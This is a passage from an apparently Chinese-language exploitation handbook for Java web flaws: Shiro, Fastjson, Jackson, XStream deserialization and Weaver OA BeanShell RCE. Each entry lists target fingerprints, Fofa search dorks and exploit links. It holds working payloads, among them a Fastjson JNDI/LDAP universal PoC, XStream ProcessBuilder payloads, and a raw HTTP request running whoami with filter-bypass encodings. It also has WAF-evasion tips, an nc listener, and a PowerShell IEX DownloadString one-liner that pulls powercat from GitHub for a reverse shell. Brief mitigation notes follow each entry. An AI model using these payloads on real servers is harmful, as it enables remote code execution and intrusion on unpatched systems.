<code>rememberMe=deleteMe</code> 来断定 <code>shiro</code> <code>key</code> 的正确性, 前提是服务器有<code>rememberMe=deleteMe</code>相关回显</p><p><strong>8. 防护方法</strong></p><p>1.升级Shiro到最新版</p><p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><p>3.WAF拦截Cookie中长度过大的rememberMe值</p><h2 id="Apache-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#Apache-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="Apache Shiro Padding Oracle Attack (Shiro-721)"></a>Apache Shiro Padding Oracle Attack (Shiro-721)</h2><p><strong>1. 漏洞简介</strong></p><p>Apache Shiro 是企业常见的 Java安全框架, 由于<code>Shiro</code>使用<code>AES-CBC</code>模式进行加解密处理, 所以存在<code>Padding Oracle Attack</code>漏洞, 已经登录的攻击者同样可以进行反序列化操作</p><p><strong>2. 影响组件</strong></p><p>Apache Shiro &lt; 1.4.2</p><p><strong>3. 漏洞指纹</strong></p><p><code>set-Cookie: rememberMe=deleteMe</code><br>URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193165</a></p><p>Apache Shiro 远程代码执行漏洞复现 – OnionT’s Blog<br><a href="http://www.oniont.cn/index.php/archives/298.html" target="_blank" rel="noopener">http://www.oniont.cn/index.php/archives/298.html</a></p><p><strong>6. 漏洞利用</strong></p><p>wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)<br><a href="https://github.com/wuppp/shiro_rce_exp" target="_blank" rel="noopener">https://github.com/wuppp/shiro_rce_exp</a></p><p><strong>7. 利用技巧</strong></p><p>1.该漏洞需要登录后获取到合法的<code>Cookie: rememberMe=XXX</code>后才可以进行利用, 看起来不是很好利用</p><p>但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥</p><p>所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性</p><p>2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 <code>rememberMe</code></p><p><strong>8. 防护方法</strong></p><p>1.升级Shiro到最新版</p><p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><p>3.WAF拦截Cookie中长度过大的rememberMe值</p><p>4.WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie</p><h2 id="Apache-Shiro-权限绕过漏洞-Shiro-682"><a href="#Apache-Shiro-权限绕过漏洞-Shiro-682" class="headerlink" title="Apache Shiro 权限绕过漏洞 (Shiro-682)"></a>Apache Shiro 权限绕过漏洞 (Shiro-682)</h2><p><strong>1. 漏洞简介</strong></p><p>Apache Shiro 是企业常见的Java安全框架, 由于Shiro的拦截器和spring(Servlet)拦截器对于URI模式匹配的差异, 导致出现鉴权问题</p><p><strong>2. 影响组件</strong></p><p>Apache Shiro &lt; 1.5.2</p><p><strong>3. 漏洞指纹</strong></p><p><code>set-Cookie: rememberMe=deleteMe</code><br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-权限绕过漏洞分析（cve-2020-1957）/" target="_blank" rel="noopener">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p><p><strong>6. 漏洞利用</strong></p><p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-权限绕过漏洞分析（cve-2020-1957）/" target="_blank" rel="noopener">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p><p><strong>7. 利用技巧</strong></p><p>1.url中间可以尝试添加 <code>../</code> , 不限于这个漏洞, 可能会有惊喜, 错误的Nginx配置也会造成新的漏洞</p><p>关于url解析的问题可以参考以下链接</p><p>A New Era of SSRF – Exploiting URL Parser in Trending Programming Languages!<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><p>Tomcat URL解析差异性导致的安全问题 – 先知社区<br><a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a></p><p><strong>8. 防护方法</strong></p><p>1.升级1.5.2版本及以上</p><p>2.尽量避免使用*通配符作为动态路由拦截器的URL路径表达式.</p><h2 id="Fastjson-反序列化远程代码执行漏洞"><a href="#Fastjson-反序列化远程代码执行漏洞" class="headerlink" title="Fastjson 反序列化远程代码执行漏洞"></a>Fastjson 反序列化远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Fastjosn 无疑是这两年的漏洞之王, 一手反序列化RCE影响无数厂商, 目前1.2.48以下版本稳定受影响, 1.2.68以下版本开启Autotype会受到影响</p><p>(不排除传说中的1.2.67以下RCE漏洞, 期待八仙过海)</p><p><strong>2. 影响组件</strong></p><p>Fastjson &lt; 1.2.48 (&lt;1.2.68?)</p><p><strong>3. 漏洞指纹</strong></p><p>可以通过DNS回显的方式检测后端是否使用Fastjson</p><pre><code class="hljs perl">{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.Inet4Address"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.Inet6Address"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.InetSocketAddress"</span>{<span class="hljs-string">"address"</span>:, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}}{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"com.alibaba.fastjson.JSONObject"</span>, {<span class="hljs-string">"@type"</span>: <span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}}<span class="hljs-string">""</span>}{{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}:<span class="hljs-string">"aaa"</span>}Set[{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}]Set[{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}{{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}:<span class="hljs-number">0</span></code></pre><p>可以通过DOS时间延迟或者报错回显的方式检测</p><p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)<br><a href="https://blog.riskivy.com/无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p><p>fastjson &lt; 1.2.66 版本最新漏洞分析<br><a href="https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q</a></p><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>Fastjson &lt;=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/181874" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181874</a></p><p><strong>6. 漏洞利用</strong></p><p>1.JDK降级编译</p><p>CaijiOrz/fastjson-1.2.47-RCE: Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p><p>源项目中最后一句</p><blockquote><p>当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java</p></blockquote><p>这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的<code>.class</code> , 相信可以解决很多小伙伴的问题</p><pre><code class="hljs css"><span class="hljs-selector-tag">javac</span> <span class="hljs-selector-tag">-source</span> 1<span class="hljs-selector-class">.7</span> <span class="hljs-selector-tag">-target</span> 1<span class="hljs-selector-class">.7</span> <span class="hljs-selector-tag">Exploit</span><span class="hljs-selector-class">.java</span></code></pre><p>1.2.47版本以下通杀Poc:</p><pre><code class="hljs groovy">{<span class="hljs-string">"name"</span>:{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.lang.Class"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"com.sun.rowset.JdbcRowSetImpl"</span>}, <span class="hljs-string">"f"</span>:{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"com.sun.rowset.JdbcRowSetImpl"</span>, <span class="hljs-string">"dataSourceName"</span>:<span class="hljs-string">"ldap://asdfasfd/"</span>, <span class="hljs-string">"autoCommit"</span>:<span class="hljs-literal">true</span>}}, <span class="hljs-string">age:</span><span class="hljs-number">11</span>}</code></pre><p>其中<code>{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://asdfasfd/", "autoCommit":true}</code>也可以替换成其他利用链</p><p>2.优先使用LDAP协议</p><p>根据实战中经验, 这里更推荐使用ldap协议进行漏洞利用, 原因如下</p><blockquote><p>RMI协议的利用方式 在<code>JDK 6u132/7u122/8u113</code> 及以上版本中修复了<br>LDAP协议的利用方式 在<code>JDK 6u211/7u201/8u191</code> 及以上版本中修复了</p></blockquote><p>所以,LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制</p><p>如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎<br><a href="https://www.freebuf.com/column/207439.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207439.html</a></p><p><strong>7. 利用技巧</strong></p><p>1.如何查看服务器的jdk版本呢, 这里也有个小技巧</p><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">80</span><span class="hljs-comment">#[marshalsec中指定的HTTP端口]</span></code></pre><p>当服务器连接过来时, <code>User-Agent</code>中会标明当前服务器的JDK版本</p><p>2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]</p><p>fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson<br><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java</a></p><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GenericFastJsonRedisSerializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RedisSerializer</span>&lt;<span class="hljs-title">Object</span>&gt; </span>{<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> ParserConfig defaultRedisConfig = <span class="hljs-keyword">new</span> ParserConfig();<span class="hljs-keyword">static</span> { defaultRedisConfig.setAutoTypeSupport(<span class="hljs-literal">true</span>);}</code></pre><p>其他消息队列之类的都是同理</p><p><strong>8. 防护方法</strong></p><p>1.升级Fastjson到最新版(&gt;=1.2.68 新增了safemode, 彻底关闭autotype)<br>2.WAF拦截过滤请求包中的 <code>@type</code>, <code>%u0040%u0074%u0079%u0070%u0065</code>, <code>\u0040type</code>, <code>\x04type</code> 等多种编码的autotype变形</p><p>3.最少升级到1.2.48以上版本且关闭autotype选项</p><p>4.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><h2 id="Jackson-反序列化远程代码执行漏洞"><a href="#Jackson-反序列化远程代码执行漏洞" class="headerlink" title="Jackson 反序列化远程代码执行漏洞"></a>Jackson 反序列化远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Jackson 跟Fastjson一样, 当enableDefaultTyping开启时, 也是可以进行反序列化到代码执行</p><p><strong>2. 影响组件</strong><br>Jackson</p><p><strong>3. 漏洞指纹</strong></p><p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)<br><a href="https://blog.riskivy.com/无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考</p><p>Jackson-databind-2670远程代码执行漏洞简单分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7506" target="_blank" rel="noopener">https://xz.aliyun.com/t/7506</a></p><p><strong>6. 漏洞利用</strong></p><p>learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug<br><a href="https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson</a></p><p>POC</p><pre><code class="hljs json">[<span class="hljs-string">"ch.qos.logback.core.db.JNDIConnectionSource"</span>, {<span class="hljs-attr">"jndiLocation"</span>:<span class="hljs-string">"ldap://localhost:43658/Calc"</span>}]</code></pre><p><strong>7. 利用技巧</strong></p><p>1.把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链</p><p><strong>8. 防护方法</strong></p><p>1.升级Jackson到最新版(enableDefaultTyping默认都是关的, 问题不大)</p><p>2.确保enableDefaultTyping是关闭的</p><p>3.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><h2 id="Xstream-反序列化漏洞"><a href="#Xstream-反序列化漏洞" class="headerlink" title="Xstream 反序列化漏洞"></a>Xstream 反序列化漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Xstream Java 中经常用于处理 xml 的库, 最近一次修复中(1.4.10版本)重现了历史反序列化远程代码执行漏洞, 所以也需要关注</p><p><strong>2. 影响组件</strong></p><p>Xstream &lt;1.4.6, =1.4.10</p><p><strong>3. 漏洞指纹</strong></p><p>xml</p><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ" target="_blank" rel="noopener">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p><p><strong>6. 漏洞利用</strong></p><p>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ" target="_blank" rel="noopener">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p><pre><code class="hljs awk">import com.thoughtworks.xstream.XStream;import java.io.IOException;public class Main {<span class="hljs-regexp">//</span> POC1    public static void main(String[] args) throws IOException {            XStream xStream = new XStream();            String payload = <span class="hljs-string">"&lt;sorted-set&gt;\n"</span> +                    <span class="hljs-string">"    &lt;string&gt;foo&lt;/string&gt;\n"</span> +                    <span class="hljs-string">"    &lt;dynamic-proxy&gt;\n"</span> +                    <span class="hljs-string">"    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n"</span> +                    <span class="hljs-string">"        &lt;handler class=\"java.beans.EventHandler\"&gt;\n"</span> +                    <span class="hljs-string">"            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n"</span> +                    <span class="hljs-string">"                &lt;command&gt;\n"</span> +                    <span class="hljs-string">"                    &lt;string&gt;cmd.exe&lt;/string&gt;\n"</span> +                    <span class="hljs-string">"                    &lt;string&gt;/c&lt;/string&gt;\n"</span> +                    <span class="hljs-string">"                    &lt;string&gt;calc&lt;/string&gt;\n"</span> +                    <span class="hljs-string">"                &lt;/command&gt;\n"</span> +                    <span class="hljs-string">"            &lt;/target&gt;\n"</span> +                    <span class="hljs-string">"     &lt;action&gt;start&lt;/action&gt;"</span>+                    <span class="hljs-string">"        &lt;/handler&gt;\n"</span> +                    <span class="hljs-string">"    &lt;/dynamic-proxy&gt;\n"</span> +                    <span class="hljs-string">"&lt;/sorted-set&gt;\n"</span>;<span class="hljs-regexp">//</span>POC2<span class="hljs-regexp">//</span>        String payload = <span class="hljs-string">"&lt;java.util.PriorityQueue serialization=\"custom\"&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;unserializable-parents/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;java.util.PriorityQueue&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;default&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;size&gt;2&lt;/size&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;comparator class=\"org.apache.commons.beanutils.BeanComparator\"&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;property&gt;databaseMetaData&lt;/property&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;comparator class=\"java.util.Collections$ReverseComparator\"/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/comparator&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;/default&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;int&gt;3&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;com.sun.rowset.JdbcRowSetImpl serialization=\"custom\"&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;javax.sql.rowset.BaseRowSet&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;default&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;isolation&gt;2&lt;/isolation&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;maxRows&gt;0&lt;/maxRows&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;readOnly&gt;true&lt;/readOnly&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;dataSource&gt;ldap://ip:1389/Object&lt;/dataSource&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;params/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;/default&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/javax.sql.rowset.BaseRowSet&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;default&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;iMatchColumns&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;/iMatchColumns&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;strMatchColumns&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;string&gt;foo&lt;/string&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;/strMatchColumns&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;/default&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;com.sun.rowset.JdbcRowSetImpl reference=\"../com.sun.rowset.JdbcRowSetImpl\"/&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;/java.util.PriorityQueue&gt;\n"</span> +<span class="hljs-regexp">//</span>                <span class="hljs-string">"&lt;/java.util.PriorityQueue&gt;"</span>;        xStream.fromXML(payload);    }}</code></pre><p><strong>7. 利用技巧</strong></p><p>1.这里 <code>Xstream</code> 同样影响很多使用它的开源组件, 比如<code>Spring</code>系列</p><p>Maven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages)<br><a href="https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages" target="_blank" rel="noopener">https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages</a></p><p>2.xml 不仅可以xxe, 还能反序列化代码执行</p><p>2.xxe 漏洞用 <code>xxer</code>, 方便快捷</p><p>TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab.<br><a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><h2 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p><p><strong>2. 影响组件</strong><br>泛微OA</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=ecology/weaver/bsh.servlet.BshServlet</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/215218.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/215218.html</a></p><p><a href="https://github.com/beanshell/beanshell" target="_blank" rel="noopener">https://github.com/beanshell/beanshell</a></p><p><a href="http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI" target="_blank" rel="noopener">http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</a></p><p><strong>6. 漏洞利用</strong></p><p>Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis<br><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204" target="_blank" rel="noopener">https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/weaver/bsh.servlet.BshServlet</span> HTTP/1.1<span class="hljs-attribute">Host</span>: xxxxxxxx:8088<span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">Accept-Language</span>: en<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Content-Length</span>: 98<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencodedbsh.script=eval%00("ex"%2b"ec(\"whoami\")");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</code></pre><p><strong>7. 利用技巧</strong></p><p>1.其他形式绕过</p><pre><code class="hljs lsl">eval%<span class="hljs-number">00</span>(<span class="hljs-string">"ex"</span>%<span class="hljs-number">2</span>b<span class="hljs-string">"ec(<span class="hljs-subst">\"</span>whoami<span class="hljs-subst">\"</span>)"</span>);` 也可以换成 `ex\u0065c(<span class="hljs-string">"cmd /c dir"</span>);</code></pre><p>2.泛微多数都是windows环境, 反弹shell可以使用pcat</p><pre><code class="hljs reasonml">powershell <span class="hljs-constructor">IEX(New-Object System.Net.Webclient)</span>.<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span 